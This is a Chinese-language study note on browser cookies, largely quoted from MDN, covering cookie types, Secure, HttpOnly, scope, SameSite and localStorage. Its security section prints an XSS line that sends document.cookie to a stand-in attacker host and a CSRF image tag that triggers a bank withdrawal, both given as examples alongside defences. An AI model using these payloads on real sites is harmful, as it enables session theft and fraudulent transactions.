# cookie

cookie本质上是存储数据的地方。

## MDN

`HTTP Cookie（也叫Web Cookie或浏览器Cookie）是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。`

cookie 主要用于三个方面：

- 会话状态管理（如用户的登陆状态，购物车，游戏分数或其他需要记录的信息）
   
   比如我们正在聊天，你怎么确定我是本人呢？就需要一个验证身份的东西。
- 个性化设置（如用户自定义设置、主题）

   在常见的后台管理系统，有一个角色设置的东西，在这个用户下次进来的时候，还要保持上一次的设置，和角色。

- 浏览器行为跟踪（如跟踪分析行为）
    
    ga用户分析，类似于埋点。

### 会话期的cookie

`会话期Cookie是最简单的Cookie：浏览器关闭之后它会被自动删除，也就是说它仅在会话期内有效。会话期Cookie不需要指定过期时间（Expires）或者有效期（Max-Age）。需要注意的是，有些浏览器提供了会话恢复功能，这种情况下即使关闭了浏览器，会话期Cookie也会被保留下来，就好像浏览器从来没有关闭一样。`

### 持久性的cookie
`
和关闭浏览器便失效的会话期Cookie不同，持久性Cookie可以指定一个特定的过期时间（Expires）或有效期（Max-Age）。
`

expires或者有效期一过，cookie就无效了。

### Cookie的Secure 和HttpOnly 标记

`标记为 Secure 的Cookie只应通过被HTTPS协议加密过的请求发送给服务端。但即便设置了 Secure 标记，敏感信息也不应该通过Cookie传输，因为Cookie有其固有的不安全性，Secure 标记也无法提供确实的安全保障。从 Chrome 52 和 Firefox 52 开始，不安全的站点（http:）无法使用Cookie的 Secure 标记。`


`为避免跨域脚本 (XSS) 攻击，通过JavaScript的 Document.cookie API无法访问带有 HttpOnly 标记的Cookie，它们只应该发送给服务端。如果包含服务端 Session 信息的 Cookie 不想被客户端 JavaScript 脚本调用，那么就应该为其设置 HttpOnly 标记。`

设置httponly后，客户端没有读写的权限

### Cookie的作用域

`Domain 和 Path 标识定义了Cookie的作用域：即Cookie应该发送给哪些URL。`

`Domain 标识指定了哪些主机可以接受Cookie。如果不指定，默认为当前文档的主机（不包含子域名）。如果指定了Domain，则一般包含子域名。`

`例如，如果设置 Domain=mozilla.org，则Cookie也包含在子域名中（如developer.mozilla.org）。`

`Path 标识指定了主机下的哪些路径可以接受Cookie（该URL路径必须存在于请求URL中）。以字符 %x2F ("/") 作为路径分隔符，子路径也会被匹配。`

### SameSite Cookies

`SameSite Cookie允许服务器要求某个cookie在跨站请求时不会被发送，从而可以阻止跨站请求伪造攻击（CSRF）。但目前SameSite Cookie还处于实验阶段，并不是所有浏览器都支持。`

### 如何在javascript获取到cookie

`通过Document.cookie属性可创建新的Cookie，也可通过该属性访问非HttpOnly标记的Cookie。`

## 安全

### 会话劫持和XSS节

`在Web应用中，Cookie常用来标记用户或授权会话。因此，如果Web应用的Cookie被窃取，可能导致授权用户的会话受到攻击。常用的窃取Cookie的方法有利用社会工程学攻击和利用应用程序漏洞进行XSS攻击。`

```javascript
(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
```

`HttpOnly类型的Cookie由于阻止了JavaScript对其的访问性而能在一定程度上缓解此类攻击。`

### 跨站请求伪造（CSRF）
```javascript
<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
```

`
当你打开含有了这张图片的HTML页面时，如果你之前已经登录了你的银行帐号并且Cookie仍然有效（还没有其它验证步骤），你银行里的钱很可能会被自动转走。有一些方法可以阻止此类事件的发生：1.对用户输入进行过滤来阻止XSS；
任何敏感操作都需要确认；
用于敏感信息的Cookie只能拥有较短的生命周期；`

## cookie 跟localStorage 、sessionStorage的区别。

local storage 容量大，本地存储

session storage 页面打开到关闭，存储在窗口

cookie 容量小
